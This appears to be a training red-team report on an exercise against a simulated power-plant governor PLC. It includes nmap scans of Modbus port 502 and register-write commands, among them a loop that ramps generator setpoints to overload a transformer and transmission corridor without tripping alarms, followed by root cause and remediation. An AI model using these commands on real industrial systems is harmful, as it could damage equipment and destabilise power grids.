# Red Team Engagement Report — Prabal Urja Scenario 2

**Prabal Urja Grid Sentinel | Silent Generation Bias | PU-GOV-PLC-02**  
**Engagement Type:** Red-vs-Blue Live-Fire Exercise  
**Date:** [YYYY-MM-DD]  
**Classification:** TRAINING

---

## Executive Summary

The Unit-2 governor controller exposed a reachable Modbus/TCP service that accepted unauthenticated holding-register writes. The Red Team identified the OpenPLC command and feedback memory regions, correlated register values with the operator console, and gradually increased the generator dispatch setpoint. The manipulation increased generator-transformer and northern-corridor loading while keeping the PLC and monitoring services operational.

The finding demonstrates that syntactically valid industrial protocol commands can create a meaningful process effect without exploiting memory corruption, obtaining application credentials or deploying malware.

---

## Finding 1: Unauthenticated Modbus/TCP Critical Register Write

**Severity:** High  
**Affected Asset:** `PU-GOV-PLC-02`  
**Protocol:** Modbus/TCP  
**Port:** TCP 502  
**CWE:** CWE-306 — Missing Authentication for Critical Function  
**MITRE ATT&CK for ICS:** T1692.001, T0836, T0831

### Description

The controller accepted Modbus write requests from any routed source. No authenticated master identity, source allowlist or operational approval check protected the governor command block. The PLC constrained values to broad engineering bounds but did not distinguish an approved dispatch command from an attacker-issued command.

### Discovery

```bash
sudo nmap -Pn -sS -sV -p 502,8090 <TARGET_IP>
sudo nmap -Pn -p 502 --script modbus-discover <TARGET_IP>
```

A controlled read of holding registers beginning at address 1024 revealed stable command values followed by dynamic process feedback.

### Proof of Concept

Initial read:

```bash
python3 /tmp/prabal_modbus.py <TARGET_IP> read 1024 24
```

Controlled write:

```bash
python3 /tmp/prabal_modbus.py <TARGET_IP> write 1024 655
python3 /tmp/prabal_modbus.py <TARGET_IP> write 1029 101
```

Sustained generation-bias sequence:

```bash
SEQ=102
for MW in 670 685 700 715 725; do
  python3 /tmp/prabal_modbus.py <TARGET_IP> write 1024 "$MW"
  python3 /tmp/prabal_modbus.py <TARGET_IP> write 1029 "$SEQ"
  SEQ=$((SEQ+1))
  sleep 18
done
```

### Observed Operational Impact

| Measurement | Baseline | Peak observed |
|---|---:|---:|
| Generator setpoint | 650 MW | [VALUE] MW |
| Actual generation | approximately 650 MW | [VALUE] MW |
| GT-2 loading | [VALUE]% | [VALUE]% |
| North corridor loading | [VALUE]% | [VALUE]% |
| Winding temperature | [VALUE]°C | [VALUE]°C |
| Grid risk state | 0 | [VALUE] |

### Evidence

- Red command transcript: `[PATH]`
- Operator-console screenshot: `[PATH]`
- Final register snapshot: `[PATH]`
- Blue packet capture reference: `[PCAP / TIMESTAMP]`
- Source IP used: `[RED_SOURCE_IP]`

### Root Cause

- Modbus/TCP has no application authentication in the deployed path.
- TCP 502 was reachable from more network sources than operationally required.
- Critical holding-register writes were not restricted to an approved master.
- Dispatch values were not independently validated against operational authorisation.
- Detection relied heavily on static process thresholds.

### Remediation

1. Restrict TCP 502 to explicitly authorised masters.
2. Alert on FC06/FC16 writes to critical register ranges.
3. Enforce zone-level segmentation and authenticated engineering access.
4. Validate setpoints against dispatch orders and rate-of-change limits.
5. Correlate protocol commands with operator identity and process response.
6. Use an authenticated gateway where legacy protocols cross trust boundaries.

---

## Campaign Pivot

The Unit-2 operations environment identified `PU-RB-RTU-07` at River Bend Remote Substation as the feeder and bus-tie switching dependency used when the northern corridor is stressed. This provides the operational justification for Scenario 3. No DNP3 action was performed during Scenario 2.

---

## Cleanup

The Red Team restored:

- setpoint to 650 MW;
- ramp rate to 1.0 MW/s;
- automatic governor mode;
- maintenance override disabled;
- cooling demand to 100%;
- a new command sequence value.

Final validation confirmed process risk returned to normal and all services remained available.
